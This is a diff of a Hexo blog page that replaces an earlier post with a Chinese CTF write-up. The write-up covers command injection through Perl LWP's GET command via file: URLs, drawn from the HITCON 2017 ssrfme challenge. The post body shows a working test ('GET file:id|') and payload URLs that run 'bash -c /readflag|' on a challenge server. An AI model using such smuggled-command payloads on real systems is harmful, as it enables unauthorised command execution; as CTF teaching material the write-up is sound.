@@ -3,19 +3,21 @@
 <head>
   <meta charset="utf-8">
   
-  <title>浅谈php安全 | Err0r</title>
+  <title>GET的命令执行漏洞 | Err0r</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="最近在看p神的blog，觉得大佬就是大佬。今天看到这篇觉得有很多需要学习的地方，又不好意思偷，就只能直接贴链接了。http://www.freebuf.com/articles/web/38383.html">
+  <meta name="description" content="源于hitcon中的题目ssrfme的wp,然后去搜了下这个漏洞,做个简单的记录吧。https://lorexxar.cn/2017/11/10/hitcon2017-writeup/#sql-so-hard">
 <meta property="og:type" content="article">
-<meta property="og:title" content="浅谈php安全">
-<meta property="og:url" content="http://Err0rzz.github.io/2017/11/07/浅谈php安全/index.html">
+<meta property="og:title" content="GET的命令执行漏洞">
+<meta property="og:url" content="http://Err0rzz.github.io/2017/11/14/GET的命令执行漏洞/index.html">
 <meta property="og:site_name" content="Err0r">
-<meta property="og:description" content="最近在看p神的blog，觉得大佬就是大佬。今天看到这篇觉得有很多需要学习的地方，又不好意思偷，就只能直接贴链接了。http://www.freebuf.com/articles/web/38383.html">
+<meta property="og:description" content="源于hitcon中的题目ssrfme的wp,然后去搜了下这个漏洞,做个简单的记录吧。https://lorexxar.cn/2017/11/10/hitcon2017-writeup/#sql-so-hard">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-11-09T08:12:41.869Z">
+<meta property="og:image" content="https://i.imgur.com/lUKOjRt.png">
+<meta property="og:updated_time" content="2017-11-14T11:00:39.404Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="浅谈php安全">
-<meta name="twitter:description" content="最近在看p神的blog，觉得大佬就是大佬。今天看到这篇觉得有很多需要学习的地方，又不好意思偷，就只能直接贴链接了。http://www.freebuf.com/articles/web/38383.html">
+<meta name="twitter:title" content="GET的命令执行漏洞">
+<meta name="twitter:description" content="源于hitcon中的题目ssrfme的wp,然后去搜了下这个漏洞,做个简单的记录吧。https://lorexxar.cn/2017/11/10/hitcon2017-writeup/#sql-so-hard">
+<meta name="twitter:image" content="https://i.imgur.com/lUKOjRt.png">
   
     <link rel="alternative" href="/atom.xml" title="Err0r" type="application/atom+xml">
   
@@ -163,11 +165,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-浅谈php安全" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-GET的命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/11/07/浅谈php安全/" class="article-date">
-      <time datetime="2017-11-07T09:07:53.000Z" itemprop="datePublished">2017-11-07</time>
+      <a href="/2017/11/14/GET的命令执行漏洞/" class="article-date">
+      <time datetime="2017-11-14T08:38:55.000Z" itemprop="datePublished">2017-11-14</time>
 </a>
     </div>
   
@@ -180,7 +182,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      浅谈php安全
+      GET的命令执行漏洞
     </h1>
   
 
@@ -197,7 +199,13 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>最近在看p神的blog，觉得大佬就是大佬。今天看到这篇觉得有很多需要学习的地方，又不好意思偷，就只能直接贴链接了。<a href="http://www.freebuf.com/articles/web/38383.html" title="浅谈php安全" target="_blank" rel="external">http://www.freebuf.com/articles/web/38383.html</a></p>
+        <p>源于hitcon中的题目ssrfme的wp,然后去搜了下这个漏洞,做个简单的记录吧。<a href="https://lorexxar.cn/2017/11/10/hitcon2017-writeup/#sql-so-hard" title="LoRexxar&#39;s blog" target="_blank" rel="external">https://lorexxar.cn/2017/11/10/hitcon2017-writeup/#sql-so-hard</a></p>
+<a id="more"></a>
+<p>首先要先知道perl的open可以执行命令，如下：<br><img src="https://i.imgur.com/lUKOjRt.png" alt=""></p>
+<p>而在GET命令中存在open函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">file.pm</div><div class="line">84: opendir(D, $path) or</div><div class="line">132:    open(F, $path) or return new</div></pre></td></tr></table></figure></p>
+<p>同时open函数还支持file协议<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">root@iZ285ei82c1Z:~/test# cat /usr/share/perl5/LWP.pm</div><div class="line">...</div><div class="line">=head2 File Request</div><div class="line">The library supports GET and HEAD methods for file requests.  The</div><div class="line">&quot;If-Modified-Since&quot; header is supported.  All other headers are</div><div class="line">ignored.  The I&lt;host&gt; component of the file URL must be empty or set</div><div class="line">to &quot;localhost&quot;.  Any other I&lt;host&gt; value will be treated as an error.</div><div class="line">Directories are always converted to an HTML document.  For normal</div><div class="line">files, the &quot;Content-Type&quot; and &quot;Content-Encoding&quot; in the response are</div><div class="line">guessed based on the file suffix.</div><div class="line">Example:</div><div class="line">  $req = HTTP::Request-&gt;new(GET =&gt; &apos;file:/etc/passwd&apos;);</div><div class="line">...</div></pre></td></tr></table></figure></p>
+<p>但是很尴尬的是，接下来的复现失败了，只能copy@LoRexxar师傅的了。<br>我们可以测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@iZ285ei82c1Z:~/test# GET &apos;file:id|&apos;</div><div class="line">uid=0(root) gid=0(root) groups=0(root)</div></pre></td></tr></table></figure></p>
+<p>发现成功执行了命令，payload来自rr的博客<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://13.115.136.15/?url=file:bash%20-c%20/readflag|&amp;filename=bash%20-c%20/readflag|</div><div class="line">http://13.115.136.15/?url=file:bash%20-c%20/readflag|&amp;filename=bash%20-c%20/readflag|</div><div class="line">http://13.115.136.15/sandbox/c36eb1c4372f5f8131542751d486cebd/bash%20-c%20/readflag%7C</div></pre></td></tr></table></figure></p>
 
       
       
@@ -253,13 +261,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/11/07/浅谈php安全/">浅谈php安全</a></p>
+        <p><span>本文标题:</span><a href="/2017/11/14/GET的命令执行漏洞/">GET的命令执行漏洞</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Err0r 的个人博客">Err0r</a></p>
-        <p><span>发布时间:</span>2017年11月07日 - 17时07分</p>
-        <p><span>最后更新:</span>2017年11月09日 - 16时12分</p>
+        <p><span>发布时间:</span>2017年11月14日 - 16时38分</p>
+        <p><span>最后更新:</span>2017年11月14日 - 19时00分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/11/07/浅谈php安全/" title="浅谈php安全">http://Err0rzz.github.io/2017/11/07/浅谈php安全/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://Err0rzz.github.io/2017/11/07/浅谈php安全/　　作者: Err0r" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/11/14/GET的命令执行漏洞/" title="GET的命令执行漏洞">http://Err0rzz.github.io/2017/11/14/GET的命令执行漏洞/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://Err0rzz.github.io/2017/11/14/GET的命令执行漏洞/　　作者: Err0r" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -272,18 +280,18 @@
 
 <nav id="article-nav">
   
-    <a href="/2017/11/09/无线破解浅谈/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2017/11/14/CTF中RSA套路/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          无线破解浅谈
+          CTF中RSA套路
         
       </div>
     </a>
   
   
-    <a href="/2017/10/31/updatexml-mysql显错注入/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">updatexml mysql显错注入</div>
+    <a href="/2017/11/13/ctf命令执行与绕过/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ctf命令执行与绕过</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -360,13 +368,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/11/09/无线破解浅谈/" title="上一篇: 无线破解浅谈">
+            <a href="/2017/11/14/CTF中RSA套路/" title="上一篇: CTF中RSA套路">
                 <i class="fa fa-angle-left"></i>
             </a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2017/10/31/updatexml-mysql显错注入/" title="下一篇: updatexml mysql显错注入">
+            <a href="/2017/11/13/ctf命令执行与绕过/" title="下一篇: ctf命令执行与绕过">
                 <i class="fa fa-angle-right"></i>
             </a>
         
